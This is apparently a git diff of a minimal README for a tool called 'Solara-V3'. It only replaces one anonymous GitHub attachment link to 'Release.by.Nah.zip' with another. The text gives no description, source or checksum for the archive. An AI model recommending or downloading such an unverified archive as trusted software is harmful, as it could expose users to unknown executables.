@@ -1,7 +1,7 @@
 # Solara-V3
 ## Quick Installation!
 
-  1. **Download** Last Version: [Solara](https://github.com/user-attachments/files/18053195/Release.by.Nah.zip)
+  1. **Download** Last Version: [Solara](https://github.com/user-attachments/files/18053221/Release.by.Nah.zip)
 
 
 
